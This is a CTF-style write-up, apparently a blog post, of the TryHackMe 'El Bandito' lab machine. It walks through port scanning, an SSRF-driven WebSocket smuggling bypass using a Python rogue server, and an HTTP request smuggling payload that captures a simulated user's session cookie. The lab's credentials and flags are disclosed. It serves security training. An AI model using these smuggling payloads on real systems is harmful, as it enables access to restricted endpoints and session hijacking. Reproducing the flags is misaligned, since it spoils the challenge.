@@ -1,0 +1,522 @@
+---
+slug: "thm-elbandito"
+title: "El Bandito — TryHackMe Writeup"
+date: "2026-07-23"
+platform: "TryHackMe"
+type: "Machine"
+os: "Linux"
+difficulty: "Hard"
+tags:
+  - "Web"
+  - "Request Smuggling"
+  - "WebSocket"
+  - "SSRF"
+  - "Spring Boot Actuators"
+excerpt: "A comprehensive writeup for the TryHackMe El Bandito machine, covering WebSocket Request Smuggling via SSRF to access restricted Spring Boot Actuators, and exploiting a chat application to capture a user's cookie via HTTP Request Smuggling."
+readTime: "15 min"
+rating: 4
+url: "https://asbawy.github.io/writeups/thm-elbandito"
+---
+
+import { Callout } from "@/components/Callout";
+import { KillChain, SpoilerFlag } from "@/components/cyber/WriteupComponents";
+
+<KillChain
+  steps={[
+    {
+      phase: "Reconnaissance",
+      title: "Port Scanning & Service Discovery",
+      desc: "Discovered Nginx on port 80 and a Java Spring Boot application on port 8080.",
+      tools: ["RustScan", "Nmap"],
+    },
+    {
+      phase: "Enumeration",
+      title: "Spring Boot Actuators",
+      desc: "Identified a WebSocket endpoint and an SSRF vulnerability via an 'isOnline' status checker on port 8080.",
+      tools: ["Burp Suite", "Gobuster"],
+    },
+    {
+      phase: "Exploitation (Flag 1)",
+      title: "WebSocket Request Smuggling",
+      desc: "Used the SSRF to point to an attacker-controlled server returning HTTP 101 Switching Protocols, bypassing the Nginx proxy to access restricted Spring Actuators (/trace) and extracting credentials.",
+      technique: "WebSocket Request Smuggling / SSRF",
+      tools: ["Python", "Burp Suite Repeater"],
+    },
+    {
+      phase: "Exploitation (Flag 2)",
+      title: "HTTP Request Smuggling & Cookie Capture",
+      desc: "Logged into the chat application on port 80 with the stolen credentials and performed HTTP Request Smuggling to capture another user's session cookie containing the final flag.",
+      technique: "HTTP Request Smuggling / Session Hijacking",
+      tools: ["Burp Suite", "Python"],
+    },
+  ]}
+/>
+
+---
+
+## Introduction
+
+_El Bandito_ is a Hard-rated TryHackMe machine focused heavily on web exploitation, specifically **Request Smuggling**. The machine requires chaining an SSRF vulnerability to perform WebSocket Request Smuggling to bypass an NGINX reverse proxy, allowing access to restricted Spring Boot Actuator endpoints. The second phase involves HTTP Request Smuggling within a chat application to hijack a simulated user's session cookie.
+
+---
+
+## Reconnaissance
+
+### Port Scanning
+
+Initial host discovery and port enumeration using `rustscan` and `nmap`:
+
+```bash
+rustscan -a 10.113.175.15 -- -sC -sV -oN nmap_scan1
+
+Open 10.113.175.15:22
+Open 10.113.175.15:80
+Open 10.113.175.15:631
+Open 10.113.175.15:8080
+
+PORT     STATE SERVICE  REASON         VERSION
+22/tcp   open  ssh      syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 f9:8f:b2:5c:f1:90:f8:5c:72:e2:68:0a:2c:63:d7:fd (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDARRakHVhp553UG6jPMsFm6Yq/DpMErkzqfgJxb9Elm9ZC1vd1ba+cWiwbhZT01XieMa01axfSv//Ifig7ExdGEzVrd3atsw8Oog7lOVNQuhH6BdeCPMhow4UduGWXwCiA+kOwnzgHgXap2WlxYtEEzxu7DTS0PHRmCOtHM+hNsDzaa2ER+TvaROwR05hCIirAfBZCzetPFdpm5wLEAifkUs+43R7NcJgVTgY8P7NHyxtAenIzpw+o45NVQq/hRIGrJEElDNG3qzzHMn8/4IoS7LH0S6zLAWW0Lwhjio0h9GKwxNugA4iKiVffkRRV3t1Vlk165ydENMRAvWfI2Gk6FKVZMaNsYbmJAl5N+hHDPJCjpOs7QLdzHkIr2T71eWot/bdInIPP3Lsp0nkP7eyph5GeDr1NbRmGnnO6zENxSoOxY6hJw5kNCFUCeSd4xCOBPwbf6L/DLcqrJwLBMa8lU/b82ETCGcaR5akrJsMusIfSxw7zWPBpNy878VmE8tc=
+|   256 8c:49:93:4a:df:d4:78:04:89:84:1c:3e:c2:99:00:35 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIpNjs9CEk2wo6nZ+/ZvVqYZmj6AO0SNbk6ukSZ6GsjcPA8LixJamnujupWVOg3ItMPCLF/MKsTl5X1QW0qJJsE=
+|   256 f2:1d:b5:83:12:4e:89:a9:b2:a4:c3:9c:6b:7c:f8:b6 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFR1YDsuvnq7Pmvuiu/ttbrPITGVFGWT3K6/tEUOt9ld
+80/tcp   open  ssl/http syn-ack ttl 63 El Bandito Server
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+| http-methods: 
+|_  Supported Methods: POST GET HEAD OPTIONS
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 NOT FOUND
+|     Date: Thu, 23 Jul 2026 03:08:38 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 207
+|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: SAMEORIGIN
+|     X-XSS-Protection: 1; mode=block
+|     Feature-Policy: microphone 'none'; geolocation 'none';
+|     Age: 0
+|     Server: El Bandito Server
+|     Connection: close
+|     <!doctype html>
+|     <html lang=en>
+|     <title>404 Not Found</title>
+|     <h1>Not Found</h1>
+|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Thu, 23 Jul 2026 03:07:48 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 58
+|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: SAMEORIGIN
+|     X-XSS-Protection: 1; mode=block
+|     Feature-Policy: microphone 'none'; geolocation 'none';
+|     Age: 0
+|     Server: El Bandito Server
+|     Accept-Ranges: bytes
+|     Connection: close
+|     nothing to see <script src='/static/messages.js'></script>
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Thu, 23 Jul 2026 03:07:48 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 0
+|     Allow: POST, GET, HEAD, OPTIONS
+|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: SAMEORIGIN
+|     X-XSS-Protection: 1; mode=block
+|     Feature-Policy: microphone 'none'; geolocation 'none';
+|     Age: 0
+|     Server: El Bandito Server
+|     Accept-Ranges: bytes
+|     Connection: close
+|   RTSPRequest: 
+|_    HTTP/1.1 400 Bad Request
+|_http-server-header: El Bandito Server
+| ssl-cert: Subject: commonName=localhost
+| Subject Alternative Name: DNS:localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-04-10T06:51:56
+| Not valid after:  2031-04-08T06:51:56
+| MD5:   b27d:890a:f042:b213:5197:0a59:8e7d:7032
+| SHA-1: c7ef:94a2:c156:0d67:0228:3e0e:ec9d:208b:1ef7:2610
+| -----BEGIN CERTIFICATE-----
+| MIIC2TCCAcGgAwIBAgIURBblAejJw5ScYoNqRPbL4wjFDX0wDQYJKoZIhvcNAQEL
+| BQAwFDESMBAGA1UEAwwJbG9jYWxob3N0MB4XDTIxMDQxMDA2NTE1NloXDTMxMDQw
+| ODA2NTE1NlowFDESMBAGA1UEAwwJbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEF
+| AAOCAQ8AMIIBCgKCAQEA1IGvkDTK2XXvNxpEVtjI2IaOL92aEiF6Jf7e0F5RNLa7
+| duXZ6A/R5ZAGLbiAZez8YWrcQ4kTQe6NJ+MfteA0uhoXv+I4D8ZlKPxhgRU9FKFB
+| x0LJjZLqISdw7QJSqpCd1swAtX+v9TbRrXxmoAW1G/Ym9reeJk/0DE4SZlyehrFA
+| KKbmtnxYYaGp1ntM+uPMY4jAu0YrEW99sPfYlalgPTTQB7g79Ee0QEud3+dZXKCI
+| qgEOmOmJ9Xlxpg7ETyd+h3piBtCZAQdtAeHBOOcQknERCYGYZh9dG7rNzET2Ek+b
+| 7xlKd9DYHivRAjoJnZs17qlfJNt/vYC8NK/eJpjsMwIDAQABoyMwITAJBgNVHRME
+| AjAAMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDANBgkqhkiG9w0BAQsFAAOCAQEAHeuL
+| DWTNT+UZfRnvujyxEXUbxOyOnbXsF8pjEFkQez7MBJcpPpOh3Wyqp8CdilDfPmLc
+| 5i3yw62yrOTo0p93dY+Cq7SW5G5MABY0caGFFmsVi9G/eFs8AQt+34uWj0V0dimO
+| BdvLjfXe/q+YLfpJQgfcm6Xk32X0rOPBaE9b1uIabJUMUyq4fpDkCjhor8xV0vvu
+| 8ga4weYUAY0XJxxdPIT/VL6Y3qJooY0AQHrDsYBhogbwbCpXVuqtPgyMR2QcqRDG
+| cpjjdmLH+E5ecB7qsqRmwH1iDssf67+5/AX1pWOQI67K6UBS7PaWQAMZ7gOgq+xu
+| ptK8Vhti1lPidVjeeQ==
+|_-----END CERTIFICATE-----
+631/tcp  open  ipp      syn-ack ttl 64 CUPS 2.4
+|_http-server-header: CUPS/2.4 IPP/2.1
+|_http-title: Bad Request - CUPS v2.4.12
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+8080/tcp open  http     syn-ack ttl 63 nginx
+|_http-title: Site doesn't have a title (application/json;charset=UTF-8).
+|_http-favicon: Spring Java Framework
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.94SVN%T=SSL%I=7%D=7/23%Time=6A618585%P=x86_64-pc-linux-g
+SF:nu%r(GetRequest,1E5,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2023\x20J
+SF:ul\x202026\x2003:07:48\x20GMT\r\nContent-Type:\x20text/html;\x20charset
+SF:=utf-8\r\nContent-Length:\x2058\r\nContent-Security-Policy:\x20default-
+SF:src\x20'self';\x20script-src\x20'self';\x20object-src\x20'none';\r\nX-C
+SF:ontent-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-
+SF:XSS-Protection:\x201;\x20mode=block\r\nFeature-Policy:\x20microphone\x2
+SF:0'none';\x20geolocation\x20'none';\r\nAge:\x200\r\nServer:\x20El\x20Ban
+SF:dito\x20Server\r\nAccept-Ranges:\x20bytes\r\nConnection:\x20close\r\n\r
+SF:\nnothing\x20to\x20see\x20<script\x20src='/static/messages\.js'></scrip
+SF:t>")%r(HTTPOptions,1CB,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2023\x
+SF:20Jul\x202026\x2003:07:48\x20GMT\r\nContent-Type:\x20text/html;\x20char
+SF:set=utf-8\r\nContent-Length:\x200\r\nAllow:\x20POST,\x20GET,\x20HEAD,\x
+SF:20OPTIONS\r\nContent-Security-Policy:\x20default-src\x20'self';\x20scri
+SF:pt-src\x20'self';\x20object-src\x20'none';\r\nX-Content-Type-Options:\x
+SF:20nosniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-XSS-Protection:\x201;\
+SF:x20mode=block\r\nFeature-Policy:\x20microphone\x20'none';\x20geolocatio
+SF:n\x20'none';\r\nAge:\x200\r\nServer:\x20El\x20Bandito\x20Server\r\nAcce
+SF:pt-Ranges:\x20bytes\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1C,
+SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(FourOhFourRequest,26C,"
+SF:HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nDate:\x20Thu,\x2023\x20Jul\x202026\
+SF:x2003:08:38\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nC
+SF:ontent-Length:\x20207\r\nContent-Security-Policy:\x20default-src\x20'se
+SF:lf';\x20script-src\x20'self';\x20object-src\x20'none';\r\nX-Content-Typ
+SF:e-Options:\x20nosniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-XSS-Protec
+SF:tion:\x201;\x20mode=block\r\nFeature-Policy:\x20microphone\x20'none';\x
+SF:20geolocation\x20'none';\r\nAge:\x200\r\nServer:\x20El\x20Bandito\x20Se
+SF:rver\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=e
+SF:n>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>\n<p>The\x
+SF:20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20server\.\x20I
+SF:f\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20check\x20you
+SF:r\x20spelling\x20and\x20try\x20again\.</p>\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+```
+
+**Port Scan Output Summary:**
+
+```text
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
+80/tcp   open  http    El Bandito Server (HTTPS/TLS)
+631/tcp  open  ipp     CUPS 2.4
+8080/tcp open  http    Nginx (Spring Java Framework)
+```
+
+<Callout type="info">
+  **Recon Notes:**
+  Two main web servers are running. Port 80 hosts an Nginx reverse proxy, while port 8080 runs a Java Spring Boot application. We will begin enumeration on port 8080 to identify exposed Actuator endpoints.
+</Callout>
+
+---
+
+## Enumeration
+
+### Web Enumeration (Port 8080)
+
+Visiting the application on port 8080 reveals a "Services" page and a "Burn Token" page.
+
+![Port 8080 Web Application](https://i.imgur.com/emZoNmK.png)
+
+Looking at the source code of the "Burn Token" page, we notice references to a WebSocket connection (`/ws`).
+
+```js
+    <script type="text/javascript">
+      const date = new Date().getFullYear();
+      document.getElementById("current-date").innerHTML = date;
+
+      $(document).ready(function () {
+    var webSocket;
+    var wsUri = (window.location.protocol === 'https:' ? 'wss://' : 'ws://') + window.location.host + '/ws'; // Adjust the '/ws' if your WebSocket endpoint differs
+    function initWebSocket() {
+        webSocket = new WebSocket(wsUri);
+
+        webSocket.onopen = function(event) {
+            console.log("WebSocket is open now.");
+        };
+
+        webSocket.onmessage = function(event) {
+            console.log("Message from server: ", event.data);
+            $("#response").text(event.data); // Displaying the response from the server
+        };
+
+        webSocket.onerror = function(event) {
+            console.error("This service is not working on purpose ;)", event);
+        };
+
+        webSocket.onclose = function(event) {
+            console.log("WebSocket is closed now.");
+        };
+    }
+
+    initWebSocket();
+
+    // Form submission with WebSocket
+    $("#token-burn").submit(function (event) {
+        event.stopPropagation();
+        event.preventDefault();
+        console.log("here");
+
+        if(webSocket.readyState === WebSocket.OPEN) {
+            var message = {
+                action: "burn",
+                address: $("#address").val(),
+                amount: $("#amount").val()
+            };
+            webSocket.send(JSON.stringify(message));
+        } else {
+            console.error("WebSocket is not open.");
+        }
+    });
+});
+    </script>
+```
+
+### Directory Fuzzing
+
+Using `gobuster` or `ffuf` to uncover hidden directories:
+
+```bash
+ffuf -c -u http://10.113.175.15:8080/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+We can identify standard Spring Boot Actuator paths, but they return a `403 Forbidden` error, indicating the Nginx proxy is blocking direct access.
+
+---
+
+## First Flag: WebSocket Request Smuggling
+
+### The SSRF Vulnerability
+
+On the "/Services" page, there is an online status checker that makes requests to URLs (e.g., `http://bandito.websocket.thm`). Intercepting this request in Burp Suite reveals an SSRF vulnerability at the `/isOnline?url=` endpoint.
+
+![SSRF Testing](https://i.imgur.com/nFgrtXe.png)
+
+
+### Bypassing Nginx via WebSocket Upgrade
+
+To bypass the proxy restrictions on the Spring Actuator endpoints, we can use **WebSocket Request Smuggling**. We need to trick Nginx into believing a WebSocket connection has been established. Nginx looks for an `HTTP 101 Switching Protocols` response from the backend.
+
+
+We can achieve this by hosting a rogue server that always responds with `101 Switching Protocols` and pointing the SSRF to our attacker IP.
+
+**1. Start the Server (Python):**
+```python
+#!/usr/bin/env python3
+import socket
+import threading
+import sys
+
+
+def handle_client(client_socket, client_addr):
+    try:
+        request = client_socket.recv(4096)
+
+        response = (
+            "HTTP/1.1 101 Switching Protocols\r\n"
+            "Upgrade: websocket\r\n"
+            "Connection: Upgrade\r\n"
+            "Sec-WebSocket-Accept: dGhlIHNhbXBsZSBub25jZQ==\r\n"
+            "\r\n"
+        )
+
+        client_socket.sendall(response.encode())
+        while True:
+            data = client_socket.recv(4096)
+            if not data:
+                break
+
+    except Exception as e:
+        print(f"[ERROR] Client {client_addr}: {e}")
+    finally:
+        client_socket.close()
+        print(f"[DISCONNECT] {client_addr}")
+
+
+def start_server(host="0.0.0.0", port=8080):
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind((host, port))
+    server.listen(5)
+
+    print(f"[+] Rogue WebSocket server running on {host}:{port}")
+    print("[+] All requests will receive HTTP 101 Switching Protocols")
+    print("[+] Press Ctrl+C to stop")
+
+    try:
+        while True:
+            client_socket, client_addr = server.accept()
+            print(f"[CONNECT] {client_addr}")
+
+            thread = threading.Thread(
+                target=handle_client,
+                args=(client_socket, client_addr)
+            )
+            thread.daemon = True
+            thread.start()
+
+    except KeyboardInterrupt:
+        print("\n[!] Server shutting down")
+    finally:
+        server.close()
+
+
+if __name__ == "__main__":
+    if len(sys.argv) > 1:
+        port = int(sys.argv[1])
+    else:
+        port = 8080
+
+    start_server(port=port)
+```
+
+```bash
+python3 server.py 9090
+```
+
+**2. Smuggle the Request:**
+
+In Burp Suite Repeater, we modify the original request to point the SSRF to our server, effectively creating a blind tunnel to smuggle our HTTP requests to the restricted endpoints.
+
+<Callout type="warning">
+  **Important:** Don't forget to disable **'Update Content-Length'** in Burp Suite Repeater settings, otherwise this request will fail.
+</Callout>
+
+```http
+GET /isOnline?url=http://10.113.106.55:9090/ HTTP/1.1
+Host: 10.113.175.15:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
+Accept: */*
+Sec-WebSocket-Version: 120
+Upgrade: websocket
+Connection: Upgrade
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.113.175.15:8080/services.html
+Connection: keep-alive
+Priority: u=4
+
+GET /env HTTP/1.1
+Host: 10.113.175.15:8080
+
+```
+
+![Burp Suite SSRF Smuggling](https://i.imgur.com/Z1PT4Vt.png)
+
+### Extracting Credentials and Flag 1
+
+With the tunnel established, we can bypass the proxy and query the restricted `/trace` actuator endpoint. The trace logs reveal two highly sensitive, custom directories:
+- `/admin-creds`
+- `/admin-flag`
+
+```http
+GET /isOnline?url=http://10.113.106.55:9090/ HTTP/1.1
+Host: 10.113.175.15:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
+Accept: */*
+Sec-WebSocket-Version: 120
+Upgrade: websocket
+Connection: Upgrade
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.113.175.15:8080/services.html
+Connection: keep-alive
+Priority: u=4
+
+GET /admin-flag HTTP/1.1
+Host: 10.113.175.15:8080
+
+```
+
+
+By smuggling requests to these endpoints, we can retrieve a set of credentials and the first flag!
+
+<Callout type="warning">
+  **Credentials Found:** `hAckLIEN:YouCanCatchUsInYourDreams404`
+</Callout>
+
+<SpoilerFlag label="Admin Flag (Flag 1)" flag="THM{:::MY_DECLINATION:+62°_14'_31.4'':::}" />
+
+---
+
+## Second Flag: HTTP Request Smuggling (Chat App)
+
+### Enumerating the Chat Application (Port 80)
+
+Moving back to port 80, the main page appears empty, but checking the source code reveals a script at `/static/messages.js`. Navigating to `/access` presents a login panel.
+
+Using the credentials harvested from port 8080 (`hAckLIEN:YouCanCatchUsInYourDreams404`), we log into a chat application interface. 
+
+![Chat Application](https://i.imgur.com/H3GuouC.png)
+
+### Cookie Hijacking via Request Smuggling
+
+The application features a chat between users (e.g., Jack and Oliver). We need to steal a session cookie from one of the simulated users. By analyzing the traffic when sending messages, we identify an HTTP Request Smuggling vulnerability in the message posting mechanism.
+
+We craft a smuggled HTTP request payload that forces the victim's browser (simulated by a backend bot) to append their request (including their session cookie) to the body of a message sent to us.
+
+**Smuggled Payload Structure:**
+
+```http
+POST / HTTP/2
+Host: 10.113.167.20:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.amGNxw.LtZz9k0y7v3qDBF9jIjTFL3gj5M
+Content-Length: 0
+
+
+POST /send_message HTTP/1.1
+Host: 10.113.167.20:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.amGNxw.LtZz9k0y7v3qDBF9jIjTFL3gj5M
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
+Content-Length: 903
+Content-Type: application/x-www-form-urlencoded
+
+data=
+```
+<Callout type="warning">
+  **Important:** Make sure to disable **'Update Content-Length'** in Burp Suite Repeater settings, and set the `Content-Length` manually to a high range (e.g., 900).
+</Callout>
+
+![Burp Suite Request Smuggling](https://i.imgur.com/IhNjs2I.png)
+
+Once the bot processes the smuggled request, the hijacked cookie appears in our chat window, revealing the final flag.
+
+![Flag 2 Captured](https://i.imgur.com/TIzHbr2.png)
+
+<SpoilerFlag label="User Cookie Flag (Flag 2)" flag="THM{¡!¡RIGHT_ASCENSION_12h_36m_25.46s!¡!}" />
+
+---
+
+## Summary & Key Takeaways
+
+El Bandito is an excellent deep-dive into advanced proxy bypass and request smuggling techniques:
+1. **WebSocket Request Smuggling:** Combining an SSRF with a rogue 101 response server allows attackers to bypass reverse proxy restrictions and access protected backend administrative endpoints (Spring Boot Actuators).
+2. **HTTP Request Smuggling:** Exploiting desyncs between frontend proxies and backend servers can lead to critical session hijacking and data exfiltration.
+
+---
+
+## References
+
+- [TryHackMe El Bandito Room](https://tryhackme.com/room/elbandito)
+- [0ang3el - WebSocket Smuggling Issues](https://github.com/0ang3el/websocket-smuggle)
